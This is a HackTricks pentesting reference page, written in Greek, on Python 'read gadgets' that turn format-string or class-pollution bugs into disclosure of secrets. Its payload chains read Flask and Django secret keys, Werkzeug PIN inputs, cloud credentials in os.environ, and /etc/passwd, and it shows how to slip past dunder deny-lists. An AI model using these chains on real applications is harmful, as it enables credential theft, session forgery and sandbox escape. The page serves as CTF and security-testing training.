# Python Internal Read Gadgets

{{#include ../../banners/hacktricks-training.md}}

## Βασικές πληροφορίες

Διαφορετικές ευπάθειες, όπως τα [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) ή το [**Class Pollution**](class-pollution-pythons-prototype-pollution.md), ενδέχεται να σας επιτρέψουν να **διαβάσετε εσωτερικά δεδομένα της Python, χωρίς όμως να μπορείτε να εκτελέσετε κώδικα**. Επομένως, ένας pentester θα πρέπει να αξιοποιήσει στο έπακρο αυτά τα δικαιώματα ανάγνωσης, ώστε να **αποκτήσει ευαίσθητα δικαιώματα και να κλιμακώσει την ευπάθεια**.

### Flask - Ανάγνωση του secret key

Η κύρια σελίδα μιας εφαρμογής Flask πιθανότατα θα διαθέτει το καθολικό αντικείμενο **`app`**, όπου έχει ρυθμιστεί αυτό το **secret**.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
Σε αυτή την περίπτωση είναι δυνατό να προσπελάσετε αυτό το object χρησιμοποιώντας οποιοδήποτε gadget για **πρόσβαση σε global objects** από τη σελίδα [**Bypass Python sandboxes**](bypass-python-sandboxes/index.html).

Στην περίπτωση όπου **η ευπάθεια βρίσκεται σε διαφορετικό python file**, χρειάζεστε ένα gadget για traversal μεταξύ αρχείων, ώστε να φτάσετε στο κύριο αρχείο και να **προσπελάσετε το global object `app.secret_key`**, έχοντας έτσι τη δυνατότητα να [**κλιμακώσετε τα δικαιώματά σας** γνωρίζοντας αυτό το key](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Ένα payload όπως αυτό [από αυτό το writeup](https://ctftime.org/writeup/36082):<sup>[[3]](#references)</sup>
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Χρησιμοποίησε αυτό το payload για να **διαβάσεις το `app.secret_key`**. Αν το αρχικό bug σού δίνει επίσης ένα write primitive (για παράδειγμα, class pollution), μπορείς να χρησιμοποιήσεις την ίδια διαδρομή για να το αντικαταστήσεις και να υπογράψεις Flask cookies με περισσότερα προνόμια.

### Werkzeug - machine_id και node uuid

[**Χρησιμοποιώντας αυτά τα payload από αυτό το writeup**](https://vozec.fr/writeups/tweedle-dum-dee/) θα μπορέσεις να αποκτήσεις πρόσβαση στο **machine_id** και στο **uuid** του node, τα οποία είναι τα **ιδιωτικά bits** που χρειάζεσαι για να [**δημιουργήσεις το Werkzeug pin**](../../network-services-pentesting/pentesting-web/werkzeug.md) και να αποκτήσεις πρόσβαση στο python console στο `/console`, αν το **debug mode είναι ενεργοποιημένο**:<sup>[[4]](#references)</sup>
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Σημείωσε ότι μπορείς να βρεις το **local path του server προς το `app.py`**, προκαλώντας κάποιο **error** στη web page, το οποίο θα **σου δώσει το path**.

Αν το vulnerability βρίσκεται σε διαφορετικό python file, έλεγξε το προηγούμενο Flask trick για να αποκτήσεις πρόσβαση στα objects από το κύριο python file.

### Django - SECRET_KEY και settings module

Το Django settings object αποθηκεύεται σε cache στο `sys.modules` μόλις ξεκινήσει η εφαρμογή. Με μόνο read primitives μπορείς να κάνεις leak το **`SECRET_KEY`**, fallback keys, database credentials ή signing salts:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
Αν το ευάλωτο gadget βρίσκεται σε άλλο module, ελέγξτε πρώτα τα globals:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS` είναι εξίσου πολύτιμα με το τρέχον `SECRET_KEY`: εξακολουθούν να επικυρώνουν παλιές υπογεγραμμένες τιμές κατά την rotation.<sup>[[1]](#references)</sup> Κάντε επίσης leak των `SESSION_ENGINE` και `SESSION_SERIALIZER` για να προσδιορίσετε γρήγορα αν το impact περιορίζεται σε πλαστογράφηση cookies ή αν είναι ισχυρότερο. Για λεπτομέρειες σχετικά με το web impact, δείτε τη [**σελίδα Django pentesting**](../../network-services-pentesting/pentesting-web/django.md).

### Module loader gadgets - ανάγνωση source code και αρχείων

Τα φορτωμένα Python modules συνήθως διατηρούν ένα `__loader__`. Οι file-backed loaders συχνά εκθέτουν τα `get_source()` και `get_data()`, τα οποία είναι ιδανικά **read-only primitives** όταν μπορείτε ήδη να αποκτήσετε πρόσβαση σε ένα module object αλλά όχι στη `open()`:
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
Αυτό είναι πολύ χρήσιμο για την εξαγωγή **config modules, blueprints, helper files ή hidden routes** και την ανάκτηση API keys, DSN, flag paths ή πρόσθετων gadget entry points.

Αν διαθέτετε μόνο subclass enumeration, αναζητήστε τον loader με βάση το όνομα αντί να hard-code-άρετε ένα index:
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Globals του frame generator / coroutine

Αν μπορείτε να δημιουργήσετε ή να αποκτήσετε πρόσβαση σε ένα αντικείμενο generator/coroutine, το frame του μπορεί να κάνει leak τα globals **χωρίς να απαιτείται κανένα gadget συνάρτησης `__globals__`**. Αυτό είναι χρήσιμο απέναντι σε filters που αποκλείουν μόνο ονόματα dunder και παραβλέπουν attributes του frame, όπως `gi_frame`, `ag_frame`, `cr_frame` ή `f_globals`:
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
Αφού αποκτήσετε τα frame globals, συνεχίστε ακριβώς όπως και στα άλλα gadgets (`sys.modules`, objects ρυθμίσεων, `os.environ` κ.λπ.). Τα πρόσφατα sandbox escapes συνεχίζουν να το ανακαλύπτουν ξανά, επειδή τα `gi_frame` και `f_globals` δεν είναι dunder attributes και συχνά επιβιώνουν από naive deny-lists.

### Μεταβλητές περιβάλλοντος / cloud creds μέσω φορτωμένων modules

Πολλά jails εξακολουθούν να κάνουν import τα `os` ή `sys` κάπου. Μπορείτε να καταχραστείτε οποιαδήποτε προσβάσιμη συνάρτηση `__init__.__globals__` για να μεταβείτε στο ήδη imported module `os` και να εξαγάγετε **μεταβλητές περιβάλλοντος** που περιέχουν API tokens, cloud keys ή flags:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
Εάν το subclass index φιλτράρεται, χρησιμοποιήστε loaders:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Οι μεταβλητές περιβάλλοντος είναι συχνά τα μόνα secrets που απαιτούνται για τη μετάβαση από read σε πλήρη παραβίαση (cloud IAM keys, database URLs, signing keys κ.λπ.).

### Django-Unicorn class pollution (CVE-2025-24370)

Το `django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), επηρεαζόμενες εκδόσεις `<0.61.0`) επέτρεπε **class pollution** μέσω ειδικά διαμορφωμένων component requests. Ένα property path όπως το `__init__.__globals__` μπορούσε να αποκτήσει πρόσβαση στα globals του component module και στα imported modules· το advisory παρουσιάζει την overwrite του Django `SECRET_KEY` και τιμών στο `os.environ`, αντί για exploit μόνο για ανάγνωση.<sup>[[5]](#references)</sup> Αν ένα ξεχωριστό bug παρέχει read access στο ίδιο object graph, αυτά τα globals μπορεί να εκθέσουν configuration και credentials χωρίς να απαιτείται code execution.

### Gadget collections for chaining

Πρόσφατα CTFs και έρευνα σε pyjail δείχνουν αξιόπιστες read chains που βασίζονται μόνο σε attribute access και subclass enumeration. Λίστες που συντηρεί η κοινότητα, όπως το [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker), καταγράφουν εκατοντάδες minimal gadgets που μπορούν να συνδυαστούν για traversal από objects προς τα `__globals__`, `sys.modules` και τελικά προς sensitive data.<sup>[[2]](#references)</sup> Προτιμήστε **attribute/name based searches** αντί για raw subclass indexes, επειδή η θέση των `os._wrap_close`, `FileLoader`, `warnings.catch_warnings` κ.λπ. αλλάζει μεταξύ εκδόσεων της Python και ανάλογα με τις επιπλέον imported libraries.

## References

- [1] [Έγγραφα του Django για cryptographic signing](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [2] [pyjailbreaker – wiki για Python sandbox gadgets](https://github.com/jailctf/pyjailbreaker)
- [3] [CTFtime.org / idekCTF 2022 / task manager / Writeup](https://ctftime.org/writeup/36082)
- [4] [Tweedle Dum & Dee – writeup του FCSC 2023](https://vozec.fr/writeups/tweedle-dum-dee/)
- [5] [Ευπάθεια Class Pollution στο Django-Unicorn, που οδηγεί σε RCE, XSS, DoS και Authentication Bypass (GHSA-g9wf-5777-gq43)](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43)
{{#include ../../banners/hacktricks-training.md}}
